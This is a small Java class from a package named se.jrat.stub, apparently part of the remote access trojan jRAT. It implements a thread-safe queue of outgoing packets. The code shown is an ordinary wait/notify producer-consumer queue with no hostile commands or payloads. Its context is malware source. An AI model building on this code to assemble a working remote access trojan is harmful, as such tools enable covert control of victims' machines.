package se.jrat.stub;

import java.util.LinkedList;

import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;

public class PacketHandler {

	private LinkedList<AbstractOutgoingPacket> resultQueue;

	public PacketHandler() {
		this.resultQueue = new LinkedList<AbstractOutgoingPacket>();
	}

	public synchronized AbstractOutgoingPacket nextResult() {
		while (resultQueue.isEmpty()) {
			try {
				wait();
			} catch (InterruptedException e) {
				
			}
		}
		return resultQueue.removeLast();
	}

	public synchronized void processAbstractOutgoingPacket(AbstractOutgoingPacket packet) {
		if (packet == null) {
			return;
		}

		resultQueue.addFirst(packet);
		notifyAll();

	}
	
	public synchronized void silentAdd(AbstractOutgoingPacket packet) {
		resultQueue.add(packet);
	}
}